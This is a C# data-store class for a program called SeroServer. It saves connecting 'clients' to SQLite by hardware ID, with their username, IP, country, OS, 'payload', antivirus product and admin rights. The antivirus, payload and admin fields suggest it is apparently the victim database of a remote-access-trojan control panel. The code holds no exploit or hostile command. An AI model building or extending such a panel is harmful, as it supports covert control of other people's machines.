using System.Collections.Concurrent;
using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows.Data;
using Microsoft.Data.Sqlite;

namespace SeroServer.Data;

public class DataStore
{
    private static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
    private static readonly string LogPath     = Path.Combine(DataDir, "server.log");
    private static readonly string DbPath      = Path.Combine(DataDir, "clients.db");
    private static readonly string LegacyJson  = Path.Combine(DataDir, "clients.json");

    private static readonly JsonSerializerOptions JsonOpts = new() { WriteIndented = false };

    // SQLite connection — kept open for the server lifetime (WAL mode, single writer)
    private SqliteConnection? _db;
    private SqliteCommand?    _upsertCmd;

    private readonly object _lock     = new();
    private readonly object _logsLock = new();

    // Per-HWID dirty tracking — only flush rows that actually changed
    private readonly ConcurrentDictionary<string, byte> _dirtyHwids = new();
    private readonly System.Timers.Timer _saveTimer;

    // Maintained live — avoids O(n) scan every dashboard refresh
    private int _taggedCount;
    public int TaggedCount => _taggedCount;

    // Rolling 24h connect timestamps
    private readonly object _connectHistLock = new();
    private readonly Queue<DateTime> _connectHistory = new();

    public void AddConnectTimestamp(DateTime utcTime)
    {
        lock (_connectHistLock)
        {
            _connectHistory.Enqueue(utcTime);
            var cutoff = utcTime.AddHours(-25);
            while (_connectHistory.Count > 0 && _connectHistory.Peek() < cutoff)
                _connectHistory.Dequeue();
        }
    }

    public DateTime[] GetConnectHistory()
    {
        lock (_connectHistLock) { return [.. _connectHistory]; }
    }

    private readonly ConcurrentQueue<string> _logQueue = new();
    private readonly System.Timers.Timer _logFlushTimer;

    public ObservableCollection<string> Logs { get; } = [];

    /// <summary>Persistent client records indexed by HWID.</summary>
    public ConcurrentDictionary<string, ClientRecord> AllClients { get; } = new();

    public DataStore()
    {
        System.Windows.Data.BindingOperations.EnableCollectionSynchronization(Logs, _logsLock);

        Directory.CreateDirectory(DataDir);
        OpenDb();
        LoadClients();

        // Flush only dirty rows every 10s — cost is O(dirty) not O(total)
        _saveTimer = new System.Timers.Timer(10_000) { AutoReset = true };
        _saveTimer.Elapsed += (_, _) => FlushDirty();
        _saveTimer.Start();

        _logFlushTimer = new System.Timers.Timer(2_000) { AutoReset = true };
        _logFlushTimer.Elapsed += FlushLogQueue;
        _logFlushTimer.Start();
    }

    // ── Logging ─────────────────────────────────────

    public void Log(string message)
    {
        var entry = $"[{DateTime.Now:HH:mm:ss}] {message}";
        _logQueue.Enqueue(entry);
        System.Windows.Application.Current?.Dispatcher.BeginInvoke(() =>
        {
            lock (_logsLock)
            {
                Logs.Add(entry);
                if (Logs.Count > 1000)
                {
                    var keep = Logs.Skip(500).ToList();
                    Logs.Clear();
                    foreach (var l in keep) Logs.Add(l);
                }
            }
        });
    }

    private void FlushLogQueue(object? sender, System.Timers.ElapsedEventArgs e)
    {
        if (_logQueue.IsEmpty) return;
        try
        {
            var sb = new System.Text.StringBuilder();
            while (_logQueue.TryDequeue(out var line)) sb.AppendLine(line);
            File.AppendAllText(LogPath, sb.ToString());
        }
        catch { }
    }

    // ── Client Records ──────────────────────────────

    public ClientRecord RecordConnection(ConnectedClient client)
    {
        var record = AllClients.GetOrAdd(client.Hwid, _ => new ClientRecord
        {
            Hwid = client.Hwid,
            FirstSeen = DateTime.UtcNow
        });

        var connectTime = DateTime.UtcNow;
        lock (_lock)
        {
            record.LastUsername    = client.Username;
            record.LastIP          = client.IP;
            record.LastCountry     = client.Country;
            if (!string.IsNullOrEmpty(client.CountryCode)) record.LastCountryCode = client.CountryCode;
            record.LastMachineName = client.MachineName;
            record.LastOS          = client.OS;
            record.LastPayload     = client.Payload;
            record.LastAntivirus   = client.Antivirus;
            record.LastIsAdmin     = client.IsAdmin;
            if (!string.IsNullOrEmpty(client.CpuName)) record.LastCpuName = client.CpuName;
            if (!string.IsNullOrEmpty(client.GpuName)) record.LastGpuName = client.GpuName;
            record.LastSeen        = connectTime;
            record.LastConnectedAt = connectTime;
            if (client.Port > 0) record.LastPort = client.Port;
            record.ActivityLog.Add(new ActivityEntry { Action = $"Connected from {client.IP} ({client.Username})" });
            if (record.ActivityLog.Count > 20)
                record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
        }
        AddConnectTimestamp(connectTime);
        MarkDirty(client.Hwid);
        return record;
    }

    public void RecordDisconnection(string hwid)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                record.LastSeen = DateTime.UtcNow;
                record.ActivityLog.Add(new ActivityEntry { Action = "Disconnected" });
                if (record.ActivityLog.Count > 20)
                    record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
            }
            MarkDirty(hwid);
        }
    }

    public void RecordActivity(string hwid, string action)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                record.ActivityLog.Add(new ActivityEntry { Action = action });
                if (record.ActivityLog.Count > 20)
                    record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 20);
            }
            MarkDirty(hwid);
        }
    }

    public void SetTag(string hwid, string tag)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                bool hadTag = !string.IsNullOrEmpty(record.Tag);
                bool hasTag = !string.IsNullOrEmpty(tag);
                record.Tag = tag;
                if (!hadTag && hasTag)       Interlocked.Increment(ref _taggedCount);
                else if (hadTag && !hasTag)  Interlocked.Decrement(ref _taggedCount);
            }
            MarkDirty(hwid);
        }
    }

    public void SetAssignedId(string hwid, string assignedId)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock) { record.AssignedId = assignedId; }
            // Write immediately so the ID survives a crash right after connect
            UpsertOne(record);
        }
    }

    // ── Persistence ─────────────────────────────────

    public void Save() => FlushDirty();

    private void MarkDirty(string hwid) => _dirtyHwids.TryAdd(hwid, 0);

    /// <summary>Flush only rows that changed since the last tick.</summary>
    private void FlushDirty()
    {
        if (_dirtyHwids.IsEmpty) return;
        // Drain the dirty set — snapshot keys, then remove as we flush
        var keys = _dirtyHwids.Keys.ToArray();
        foreach (var hwid in keys)
        {
            if (!AllClients.TryGetValue(hwid, out var record)) continue;
            UpsertOne(record);
            _dirtyHwids.TryRemove(hwid, out _);
        }
    }

    private void UpsertOne(ClientRecord r)
    {
        if (_db == null || _upsertCmd == null) return;
        try
        {
            string activityJson;
            lock (_lock) { activityJson = JsonSerializer.Serialize(r.ActivityLog, JsonOpts); }

            lock (_db)
            {
                _upsertCmd.Parameters["@hwid"].Value           = r.Hwid;
                _upsertCmd.Parameters["@assigned_id"].Value    = r.AssignedId;
                _upsertCmd.Parameters["@tag"].Value            = r.Tag;
                _upsertCmd.Parameters["@first_seen"].Value     = r.FirstSeen.ToString("O");
                _upsertCmd.Parameters["@last_seen"].Value      = r.LastSeen.ToString("O");
                _upsertCmd.Parameters["@last_connected"].Value = r.LastConnectedAt.ToString("O");
                _upsertCmd.Parameters["@username"].Value       = r.LastUsername;
                _upsertCmd.Parameters["@ip"].Value             = r.LastIP;
                _upsertCmd.Parameters["@country"].Value        = r.LastCountry;
                _upsertCmd.Parameters["@country_code"].Value   = r.LastCountryCode;
                _upsertCmd.Parameters["@machine"].Value        = r.LastMachineName;
                _upsertCmd.Parameters["@os"].Value             = r.LastOS;
                _upsertCmd.Parameters["@payload"].Value        = r.LastPayload;
                _upsertCmd.Parameters["@antivirus"].Value      = r.LastAntivirus;
                _upsertCmd.Parameters["@cpu"].Value            = r.LastCpuName;
                _upsertCmd.Parameters["@gpu"].Value            = r.LastGpuName;
                _upsertCmd.Parameters["@ram_used"].Value       = r.LastRamUsed;
                _upsertCmd.Parameters["@ram_total"].Value      = r.LastRamTotal;
                _upsertCmd.Parameters["@is_admin"].Value       = r.LastIsAdmin ? 1 : 0;
                _upsertCmd.Parameters["@port"].Value           = r.LastPort;
                _upsertCmd.Parameters["@activity"].Value       = activityJson;
                _upsertCmd.ExecuteNonQuery();
            }
        }
        catch { }
    }

    // ── SQLite setup ─────────────────────────────────

    private void OpenDb()
    {
        _db = new SqliteConnection($"Data Source={DbPath}");
        _db.Open();

        using var cmd = _db.CreateCommand();
        // WAL mode: readers never block writers; single server process so no conflict
        cmd.CommandText = "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL;";
        cmd.ExecuteNonQuery();

        cmd.CommandText = """
            CREATE TABLE IF NOT EXISTS clients (
                hwid          TEXT PRIMARY KEY,
                assigned_id   TEXT NOT NULL DEFAULT '',
                tag           TEXT NOT NULL DEFAULT '',
                first_seen    TEXT NOT NULL DEFAULT '',
                last_seen     TEXT NOT NULL DEFAULT '',
                last_connected TEXT NOT NULL DEFAULT '',
                username      TEXT NOT NULL DEFAULT '',
                ip            TEXT NOT NULL DEFAULT '',
                country       TEXT NOT NULL DEFAULT '',
                country_code  TEXT NOT NULL DEFAULT '',
                machine       TEXT NOT NULL DEFAULT '',
                os            TEXT NOT NULL DEFAULT '',
                payload       TEXT NOT NULL DEFAULT '',
                antivirus     TEXT NOT NULL DEFAULT '',
                cpu           TEXT NOT NULL DEFAULT '',
                gpu           TEXT NOT NULL DEFAULT '',
                ram_used      INTEGER NOT NULL DEFAULT 0,
                ram_total     INTEGER NOT NULL DEFAULT 0,
                is_admin      INTEGER NOT NULL DEFAULT 0,
                port          INTEGER NOT NULL DEFAULT 0,
                activity      TEXT NOT NULL DEFAULT '[]'
            )
            """;
        cmd.ExecuteNonQuery();

        // Prepared UPSERT — reused for every flush; parameters are set per row
        _upsertCmd = _db.CreateCommand();
        _upsertCmd.CommandText = """
            INSERT INTO clients
                (hwid,assigned_id,tag,first_seen,last_seen,last_connected,
                 username,ip,country,country_code,machine,os,payload,antivirus,
                 cpu,gpu,ram_used,ram_total,is_admin,port,activity)
            VALUES
                (@hwid,@assigned_id,@tag,@first_seen,@last_seen,@last_connected,
                 @username,@ip,@country,@country_code,@machine,@os,@payload,@antivirus,
                 @cpu,@gpu,@ram_used,@ram_total,@is_admin,@port,@activity)
            ON CONFLICT(hwid) DO UPDATE SET
                assigned_id=excluded.assigned_id, tag=excluded.tag,
                first_seen=excluded.first_seen,   last_seen=excluded.last_seen,
                last_connected=excluded.last_connected,
                username=excluded.username,        ip=excluded.ip,
                country=excluded.country,          country_code=excluded.country_code,
                machine=excluded.machine,          os=excluded.os,
                payload=excluded.payload,          antivirus=excluded.antivirus,
                cpu=excluded.cpu,                  gpu=excluded.gpu,
                ram_used=excluded.ram_used,        ram_total=excluded.ram_total,
                is_admin=excluded.is_admin,        port=excluded.port,
                activity=excluded.activity
            """;
        foreach (var name in new[] {
            "@hwid","@assigned_id","@tag","@first_seen","@last_seen","@last_connected",
            "@username","@ip","@country","@country_code","@machine","@os","@payload","@antivirus",
            "@cpu","@gpu","@ram_used","@ram_total","@is_admin","@port","@activity" })
            _upsertCmd.Parameters.Add(new SqliteParameter(name, ""));
        _upsertCmd.Prepare();
    }

    private void LoadClients()
    {
        try
        {
            // ── Migrate from clients.json if DB is empty ──────────────────────
            using var countCmd = _db!.CreateCommand();
            countCmd.CommandText = "SELECT COUNT(*) FROM clients";
            long dbCount = (long)(countCmd.ExecuteScalar() ?? 0L);

            if (dbCount == 0 && File.Exists(LegacyJson))
            {
                MigrateFromJson();
                return;
            }

            // ── Normal load from SQLite ───────────────────────────────────────
            using var sel = _db.CreateCommand();
            sel.CommandText = "SELECT * FROM clients";
            using var rdr = sel.ExecuteReader();
            int tagged = 0;
            while (rdr.Read())
            {
                var r = new ClientRecord
                {
                    Hwid             = rdr.GetString(0),
                    AssignedId       = rdr.GetString(1),
                    Tag              = rdr.GetString(2),
                    FirstSeen        = ParseDt(rdr.GetString(3)),
                    LastSeen         = ParseDt(rdr.GetString(4)),
                    LastConnectedAt  = ParseDt(rdr.GetString(5)),
                    LastUsername     = rdr.GetString(6),
                    LastIP           = rdr.GetString(7),
                    LastCountry      = rdr.GetString(8),
                    LastCountryCode  = rdr.GetString(9),
                    LastMachineName  = rdr.GetString(10),
                    LastOS           = rdr.GetString(11),
                    LastPayload      = rdr.GetString(12),
                    LastAntivirus    = rdr.GetString(13),
                    LastCpuName      = rdr.GetString(14),
                    LastGpuName      = rdr.GetString(15),
                    LastRamUsed      = rdr.GetInt64(16),
                    LastRamTotal     = rdr.GetInt64(17),
                    LastIsAdmin      = rdr.GetInt32(18) != 0,
                    LastPort         = rdr.GetInt32(19),
                    ActivityLog      = ParseActivity(rdr.GetString(20)),
                };
                AllClients[r.Hwid] = r;
                if (!string.IsNullOrEmpty(r.Tag)) tagged++;
            }
            _taggedCount = tagged;
            Log($"[*] Loaded {AllClients.Count} persistent client records from DB.");
        }
        catch (Exception ex) { Log($"[!] Failed to load clients: {ex.Message}"); }
    }

    private void MigrateFromJson()
    {
        try
        {
            var json = File.ReadAllText(LegacyJson);
            var data = JsonSerializer.Deserialize<Dictionary<string, ClientRecord>>(json);
            if (data == null) return;

            int tagged = 0;
            foreach (var kv in data)
            {
                AllClients[kv.Key] = kv.Value;
                if (!string.IsNullOrEmpty(kv.Value.Tag)) tagged++;
                UpsertOne(kv.Value);
            }
            _taggedCount = tagged;
            Log($"[*] Migrated {AllClients.Count} records from clients.json → clients.db.");

            // Rename legacy file so migration never runs again
            File.Move(LegacyJson, LegacyJson + ".bak", overwrite: true);
        }
        catch (Exception ex) { Log($"[!] JSON migration failed: {ex.Message}"); }
    }

    private static DateTime ParseDt(string s)
        => DateTime.TryParse(s, null, System.Globalization.DateTimeStyles.RoundtripKind, out var dt)
           ? dt : DateTime.MinValue;

    private static List<ActivityEntry> ParseActivity(string json)
    {
        try { return JsonSerializer.Deserialize<List<ActivityEntry>>(json) ?? []; }
        catch { return []; }
    }
}
